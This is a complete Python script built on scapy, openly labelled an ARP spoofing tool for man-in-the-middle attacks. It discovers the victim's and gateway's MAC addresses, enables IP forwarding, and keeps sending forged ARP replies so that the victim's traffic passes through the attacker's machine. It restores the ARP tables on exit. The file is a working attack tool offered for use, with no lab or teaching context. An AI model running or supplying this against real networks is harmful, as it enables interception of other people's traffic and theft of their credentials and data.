#!/usr/bin/env python3
"""
ARP Spoofing Tool
Implements ARP cache poisoning to position attacker as Man-in-the-Middle
"""

import argparse
import sys
import time
import threading
import signal
import subprocess
import os
from colorama import init, Fore, Style
from scapy.all import *

init(autoreset=True)

class ARPSpoofer:
    def __init__(self, victim_ip, gateway_ip, interface, verbose=False):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.verbose = verbose
        self.running = False
        self.original_victim_mac = None
        self.original_gateway_mac = None
        self.attacker_mac = None
        
    def get_mac(self, ip):
        """Get MAC address for given IP using ARP request"""
        try:
            # Create ARP request
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # Send request and receive response
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            else:
                return None
        except Exception as e:
            print(f"{Fore.RED}Error getting MAC for {ip}: {e}{Style.RESET_ALL}")
            return None
    
    def get_interface_mac(self):
        """Get MAC address of the specified interface"""
        try:
            return get_if_hwaddr(self.interface)
        except Exception as e:
            print(f"{Fore.RED}Error getting interface MAC: {e}{Style.RESET_ALL}")
            return None
    
    def enable_ip_forwarding(self):
        """Enable IP forwarding to maintain connectivity"""
        try:
            if sys.platform.startswith('linux'):
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                             check=True, capture_output=True)
                if self.verbose:
                    print(f"{Fore.GREEN}[+] IP forwarding enabled{Style.RESET_ALL}")
            elif sys.platform == 'darwin':  # macOS
                subprocess.run(['sysctl', '-w', 'net.inet.ip.forwarding=1'], 
                             check=True, capture_output=True)
                if self.verbose:
                    print(f"{Fore.GREEN}[+] IP forwarding enabled (macOS){Style.RESET_ALL}")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Error enabling IP forwarding: {e}{Style.RESET_ALL}")
    
    def disable_ip_forwarding(self):
        """Disable IP forwarding"""
        try:
            if sys.platform.startswith('linux'):
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
                             check=True, capture_output=True)
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] IP forwarding disabled{Style.RESET_ALL}")
            elif sys.platform == 'darwin':  # macOS
                subprocess.run(['sysctl', '-w', 'net.inet.ip.forwarding=0'], 
                             check=True, capture_output=True)
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] IP forwarding disabled (macOS){Style.RESET_ALL}")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Error disabling IP forwarding: {e}{Style.RESET_ALL}")
    
    def spoof(self, target_ip, spoof_ip, target_mac):
        """Send ARP spoofing packet"""
        # Create ARP response packet
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                    psrc=spoof_ip, hwsrc=self.attacker_mac)
        send(packet, verbose=False)
    
    def restore(self, target_ip, gateway_ip, target_mac, gateway_mac):
        """Restore original ARP table entries"""
        # Restore victim's ARP table
        packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                     psrc=gateway_ip, hwsrc=gateway_mac)
        # Restore gateway's ARP table  
        packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                     psrc=target_ip, hwsrc=target_mac)
        
        send(packet1, count=4, verbose=False)
        send(packet2, count=4, verbose=False)
    
    def start_spoofing(self):
        """Main spoofing loop"""
        print(f"{Fore.CYAN}[*] Starting ARP spoofing...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Victim: {self.victim_ip} ({self.original_victim_mac}){Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Gateway: {self.gateway_ip} ({self.original_gateway_mac}){Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Attacker: {self.attacker_mac}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Interface: {self.interface}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Press Ctrl+C to stop and restore ARP tables{Style.RESET_ALL}")
        
        sent_packets = 0
        while self.running:
            try:
                # Spoof victim (tell victim that gateway is at attacker's MAC)
                self.spoof(self.victim_ip, self.gateway_ip, self.original_victim_mac)
                
                # Spoof gateway (tell gateway that victim is at attacker's MAC)
                self.spoof(self.gateway_ip, self.victim_ip, self.original_gateway_mac)
                
                sent_packets += 2
                
                if self.verbose:
                    print(f"{Fore.BLUE}[*] Packets sent: {sent_packets}{Style.RESET_ALL}", end='\r')
                
                time.sleep(2)
            except Exception as e:
                print(f"{Fore.RED}[-] Error during spoofing: {e}{Style.RESET_ALL}")
                break
    
    def run(self):
        """Main execution function"""
        print(f"{Fore.CYAN}{'='*50}")
        print(f"{Fore.CYAN}ARP SPOOFING TOOL")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        
        # Check if running as root
        if os.geteuid() != 0:
            print(f"{Fore.RED}[-] This script must be run as root (use sudo){Style.RESET_ALL}")
            sys.exit(1)
        
        # Get MAC addresses
        print(f"{Fore.CYAN}[*] Discovering MAC addresses...{Style.RESET_ALL}")
        
        self.original_victim_mac = self.get_mac(self.victim_ip)
        if not self.original_victim_mac:
            print(f"{Fore.RED}[-] Could not find MAC address for victim {self.victim_ip}{Style.RESET_ALL}")
            sys.exit(1)
        
        self.original_gateway_mac = self.get_mac(self.gateway_ip)
        if not self.original_gateway_mac:
            print(f"{Fore.RED}[-] Could not find MAC address for gateway {self.gateway_ip}{Style.RESET_ALL}")
            sys.exit(1)
        
        self.attacker_mac = self.get_interface_mac()
        if not self.attacker_mac:
            print(f"{Fore.RED}[-] Could not get MAC address for interface {self.interface}{Style.RESET_ALL}")
            sys.exit(1)
        
        # Enable IP forwarding
        self.enable_ip_forwarding()
        
        # Set up signal handler for graceful exit
        def signal_handler(sig, frame):
            print(f"\n{Fore.YELLOW}[!] Interrupt received, restoring ARP tables...{Style.RESET_ALL}")
            self.running = False
            
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start spoofing
        self.running = True
        try:
            self.start_spoofing()
        except KeyboardInterrupt:
            pass
        finally:
            # Restore ARP tables
            print(f"\n{Fore.YELLOW}[!] Restoring ARP tables...{Style.RESET_ALL}")
            self.restore(self.victim_ip, self.gateway_ip, 
                        self.original_victim_mac, self.original_gateway_mac)
            
            # Disable IP forwarding
            self.disable_ip_forwarding()
            
            print(f"{Fore.GREEN}[+] ARP tables restored. Exiting...{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='ARP Spoofing Tool for MitM attacks')
    parser.add_argument('-v', '--victim', required=True, help='Victim IP address')
    parser.add_argument('-g', '--gateway', required=True, help='Gateway IP address')
    parser.add_argument('-i', '--interface', required=True, help='Network interface')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Validate IP addresses
    try:
        import ipaddress
        ipaddress.ip_address(args.victim)
        ipaddress.ip_address(args.gateway)
    except ValueError as e:
        print(f"{Fore.RED}[-] Invalid IP address: {e}{Style.RESET_ALL}")
        sys.exit(1)
    
    # Create and run spoofer
    spoofer = ARPSpoofer(args.victim, args.gateway, args.interface, args.verbose)
    spoofer.run()

if __name__ == '__main__':
    main()
